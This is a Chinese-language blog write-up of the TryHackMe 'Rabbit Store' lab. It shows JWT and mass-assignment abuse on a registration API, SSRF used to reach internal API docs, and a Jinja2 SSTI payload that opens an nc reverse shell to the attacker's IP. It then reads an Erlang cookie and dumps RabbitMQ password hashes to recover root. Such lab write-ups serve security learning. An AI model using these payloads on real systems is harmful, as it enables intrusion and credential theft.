---
title: Rabbit Store
subtitle:
date: 2025-03-14T13:12:50+08:00
slug: 92493d7
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - TryHackMe
categories:
  - TryHackMe
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->

 ### 任务要求

首先通过利用成批分配漏洞激活账号。利用存在SSRF的api进行访问另一个SSTI攻击目标，实现RCE拿到shell，获得shell后查看Erlang cookie，枚举RabbitMQ发现root密码

![](images/ccb30768febfc4f7e4b4f5e43c299c82.png)



nmap扫描收集信息

``` Shell
nmap -T4 -n -sC -sV -Pn -p- 10.10.100.9
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nmap扫描后，80端口被重定向到http://cloudsite.thm/，在hosts文件添加

```
10.10.100.9 cloudsite.thm
```



![](images/d5f051fbe8968cead43fe958605e0574.png)

一个关于云服务的静态网站，发现并没有什么可利用，尝试访问登录，发现跳转到storage.cloudsite.thm，使用需要再去添加hosts文件

```
10.10.100.9 cloudsite.thm storage.cloudsite.thm
```

尝试注册登录账号，发现注册以后尝试登陆，提示账号未激活，尝试登录注册抓包（从中注册成功开始抓包，登录时也抓包）

![](images/fd958bc667af161da9a2a9a73f962ba6.png)

抓包发现api接口可尝试访问

![](images/9cabbc0a9efb98194878312fe2d2b3dc.png)

尝试ffuf进行模糊测试

``` Shell
ffuf -u 'http://storage.cloudsite.thm/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc all -t 100 -ic -fc 404

uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 112ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 2542ms]
```

查看/api/uploads

``` Shell
curl -s 'http://storage.cloudsite.thm/api/uploads'
{"message":"Token not provided"}   
```

发现不能提供token，再次抓包尝试

![](images/f429e1d1cc6c5050a6ea42938ec7c4b4.png)

jwt解码，得到格式

``` JWT
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "email": "1111@1111.com",
    "subscription": "inactive",
    "iat": 1740497525,
    "exp": 1740501125
  },
  "signature": "TmjA-gb3BFkqNKG2Xdq0uEl415GKTizt-87btiAAUkw",
  "verified": false,
  "secret": ""
}
```

发现subscription的状态为inactive，尝试修改为active，注册界面抓包再次发包

![](images/18233f6607aaa07ed501249c647f8acb.png)



``` 
POST /api/register HTTP/1.1

Host: storage.cloudsite.thm

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate, br

Referer: http://storage.cloudsite.thm/register.html

Content-Type: application/json

Content-Length: 71

Origin: http://storage.cloudsite.thm

Connection: keep-alive

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjExMTFAMTExMS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NDA0OTkwNTEsImV4cCI6MTc0MDUwMjY1MX0%3d.8kiRVL_RDuvwDpy4KdmHMxFfa4lvZdIsidK9fEvjzwU

Priority: u=0



{"email":"t1ng@t1ng.com","password":"t1ng",

"subscription":"active"

}
```

发包以后尝试登录

![](images/3152b396fe3194cc1b6fe871ec85c97a.png)

登陆成功，发现两种上传方法，一种本地文件，另一种url
本地服务写入test.txt文件，启动python的web服务

``` Shell
python3 -m http.server 8888
```



![](images/3117f3860596f2ce6e3c248a4d0ec1a1.png)



``` Shell
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.100.9 - - [25/Feb/2025 11:16:58] "GET /test.txt HTTP/1.1" 200 -
```

文件重定向到图示目录，利用SSRF漏洞，尝试访问之前无法访问的/api/docs，但是当强制发出请求时，仍是拒绝访问

![](images/d5ed67ec5e21e5ac2df0b3fa2ba3f54d.png)

发包尝试根据文件位置读到上传的文件内容，继续发包，接下来尝试通过Apache路由（端口3000，为express的默认端口)

```
POST /api/store-url HTTP/1.1

Host: storage.cloudsite.thm

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate, br

Referer: http://storage.cloudsite.thm/dashboard/active?

Content-Type: application/json

Content-Length: 40

Origin: http://storage.cloudsite.thm

Connection: keep-alive

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InR0dEB0dHQuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQwNTAxODgwLCJleHAiOjE3NDA1MDU0ODB9.Kqx2s88qAU0xJyQY9tfrXLWidhtqwLFPgQXsehewiWA

Priority: u=0



{"url":"http://127.0.0.1:3000/api/docs"}
```



![](images/c1b59a23c8c5fe336ad4328dc4e647ae.png)

成功检索了api文档，根据拿到目录再次发包

![](images/17361de9f51bff69c8dcee30b5c97fdb.png)

拿到一堆api查看是否有可用的，其中发现/api/fetch_messeges_from_chatbot接收了POST请求
通过SSTI进行rce
使用json的/api/fetch_messeges_from_chatbot空负载测试，发现需要username参数

![](images/86707459c1c6b8d45bf4497204bfd934.png)

发送username并以admin发送

![](images/c22a62e99fd6e89b428e7f43cb92afe5.png)

提示chatbot正在开发，但是username仍有回显，尝试多语言ssti有效载荷测试



![](images/202eb98a099a79a01208fae97b624f83.png)

发现导致Jinja2模板出现错误，所以username存在ssti攻击，并且使用就Jinja2模板引擎，写出反向shell直接rce

```
"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.115.175 1234 >/tmp/f').read() }}"
```

同时监听端口1234

![](images/2b0d196a421e05dda77bc52d47f54b7f.png)



![](images/2e362031d8d038dd67277973dc1f96e8.png)



```
cat /home/azrael/user.txt
```



![](images/96a6dec9f4ca9b4ae333f74ceb9c04a8.png)

拿到第一题的答案
枚举系统文件，发现/var/lib/rabbitmq/.erlang.cookie保存的文件是全局可读，读取获得Erlang Cookie

![](images/0bed752e0aa385949bed3fe8c1ec6c1d.png)

在端口扫描中，RabbitMQ在服务器上运行，使用ErlangCookie可以对其继续宁身份验证，默认格式为`rabbit@<hostname>`，将主机名添加到hosts

```
10.10.100.9 cloudsite.thm storage.cloudsite.thm forge
```

使用rabbitmqctl对发现的Cookie进行枚举

``` Shell
sudo rabbitmqctl --erlang-cookie 'aKQCJe8w9xOgSzl4' --node rabbit@forge status
```



![](images/dabea1da042343793beb5e31ae6d6ab3.png)

枚举RabbitMQ用户

``` Shell
sudo rabbitmqctl --erlang-cookie 'aKQCJe8w9xOgSzl4' --node rabbit@forge list_users
```



![](images/dda8f32d8b21045f418452d3c4e7648a.png)

发现用户密码是sha-256，检索实例的哈希

``` Shell
sudo rabbitmqctl --erlang-cookie 'aKQCJe8w9xOgSzl4' --node rabbit@forge export_definitions /tmp/definitions.json
```



![](images/1f6363f4d9286218802be138d16be286.png)

哈希值采用base64编码，根据文档`base64(<4 byte salt> + sha256(<4 byte salt> + <password>))`
为获得hash先将base64转化为十六进制

``` Shell
echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100

e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

删除开头四字节盐，剩下的为hash值

```
295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

尝试登录root用户

![](images/a7de0c012cda6ce41020c540854893b8.png)

获取root.txt

``` Shell
cat /root/root.txt
```



![](images/e52ea217342d6283d6abe013dee7a5bc.png)





![](images/2d693150614c649a83fbb9cd00c642d4.png)

